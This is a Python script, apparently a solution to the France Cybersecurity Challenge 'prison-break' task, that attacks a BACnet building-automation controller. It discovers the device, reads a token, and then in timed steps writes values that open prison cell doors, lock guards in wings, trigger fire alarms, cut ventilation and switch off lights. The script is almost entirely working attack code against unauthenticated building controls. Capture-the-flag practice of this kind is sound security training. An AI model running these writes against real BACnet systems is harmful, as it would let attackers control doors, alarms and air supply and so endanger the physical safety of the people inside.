import BAC0
import random
import socket
import time
from BAC0.core.io.IOExceptions import NoResponseFromController
import logging
from colorama import init
from colorama import Fore, Back, Style
init(autoreset=True)


LOCAL_IP = "192.168.1.100" 
LOCAL_PORT = random.randint(1024, 65535)

if __name__ == "__main__":

    assert BAC0.version == "22.9.21", "Erreur : veuillez utiliser la version 22.9.21 de BAC0"
    try:
        target = socket.gethostbyname("prison-break.france-cybersecurity-challenge.fr")
    except:
        print(Fore.RED +"Échec de la résolution du FQDN...")
        exit(-1)

    print(Fore.GREEN +"[+] Initialisation du client BACnet local")
    bacnet = BAC0.lite(ip=LOCAL_IP, port=LOCAL_PORT)

    bacnet.whois(target)
    print(Fore.MAGENTA +"[+] Recherche du token...")
    token = None

    # Découverte des devices sur le réseau  
    devices = bacnet.whois(target)
    print(Fore.GREEN +"[+] Devices trouvés : {}".format(devices))

    # Lecture des propriétés du device cible
    device_id = devices[0][1] 
    object_list = bacnet.read("{} device {} objectList".format(target, device_id))
    print(object_list)
    object_names = []

    #for object in object_list:
    #    obj_type = object[0]
    #    obj_id = object[1]
    #    object_names.append((obj_type, bacnet.read("{} {} {} objectName".format(target, obj_type, obj_id)), obj_id))

    #print(Fore.GREEN + f"{object_names}")
    token = bacnet.read(f"{target} characterstringValue 1 description")
    print(Fore.GREEN + f"token : {token}")

#logging.basicConfig(level=logging.DEBUG)


# Checkpoint 1 (t0+15s)
print(Fore.YELLOW + "Checkpoint 1 - Ouverture des cellules et porte principale de l'aile OUEST")

start_time = time.time()
for i in range(23, 35):  
    bacnet.write(f"{target} binaryValue {i} presentValue active")
bacnet.write(f"{target} binaryValue 35 presentValue active")

elapsed_time = time.time() - start_time
remaining_time = max(0, 13 - elapsed_time)
time.sleep(remaining_time)

# Checkpoint 2 (t1+15s) 
start_time = time.time()
print(Fore.YELLOW + "Checkpoint 2 - Enfermement des gardes dans l'aile OUEST et déclenchement alarme incendie NORD")
bacnet.write(f"{target} binaryValue 35 presentValue inactive") #'porte_ouest_principale', 
bacnet.write(f"{target} binaryValue 43 presentValue active") #'sec_incendie_nord', 
elapsed_time = time.time() - start_time
remaining_time = max(0, 13 - elapsed_time)
time.sleep(remaining_time)


# Checkpoint 3 (t2+5s)
start_time = time.time()
print(Fore.YELLOW + "Checkpoint 3 - Coupure ventilation NORD et enfermement des gardes")  
bacnet.write(f"{target} analogValue 1 presentValue 0")#'ventilation_nord', 
bacnet.write(f"{target} binaryValue 9 presentValue inactive")#'porte_nord_principale', 
elapsed_time = time.time() - start_time
remaining_time = max(0, 5 - elapsed_time)
time.sleep(remaining_time)

# Checkpoint 4 (t3+20s)
start_time = time.time()
print(Fore.YELLOW + "Checkpoint 4 - Extinction lumières EST/centre, ouverture cellule Carlos et porte EST")
bacnet.write(f"{target} binaryValue 48 presentValue inactive") #'lumiere_est', 
bacnet.write(f"{target} binaryValue 51 presentValue inactive") #'lumiere_centre', 
bacnet.write(f"{target} binaryValue 19 presentValue active") #'porte_est_10', 
bacnet.write(f"{target} binaryValue 22 presentValue active") #'porte_est_principale', 
elapsed_time = time.time() - start_time
remaining_time = (20 - elapsed_time)
time.sleep(remaining_time)


# Checkpoint 5 (t4+5s) 
start_time = time.time()
print(Fore.YELLOW + "Checkpoint 5 - Enfermement de Carlos dans le poste de contrôle 2")
bacnet.write(f"{target} binaryValue 38 presentValue inactive")#'porte_garde_3', 
elapsed_time = time.time() - start_time
remaining_time = 5 - elapsed_time
time.sleep(remaining_time)



# Checkpoint 6 (t5+15s)
start_time = time.time()
print(Fore.YELLOW + "Checkpoint 6 - Déclenchement sécurité incendie SAS, extinction lumière avant-poste, enfermement garde") 
bacnet.write(f"{target} binaryValue 46 presentValue active")#'sec_incendie_garde',
bacnet.write(f"{target} binaryValue 50 presentValue inactive")#'lumiere_garde', 
time.sleep(9)
bacnet.write(f"{target} binaryValue 36 presentValue inactive")#'porte_garde_1',
bacnet.write(f"{target} binaryValue 42 presentValue inactive")#''porte_garde_principale', ',
remaining_time = 15 - 9 - elapsed_time
time.sleep(remaining_time)

# Checkpoint 7 (t6+10s)
print(Fore.YELLOW + "Checkpoint 7 - Libération de Carlos et ouverture des portes finales")
bacnet.write(f"{target} binaryValue 38 presentValue active")#'porte_garde_3', 
bacnet.write(f"{target} binaryValue 40 presentValue active")#'porte_garde_5', 
bacnet.write(f"{target} binaryValue 41 presentValue active")#'porte_garde_6', 

time.sleep(10)
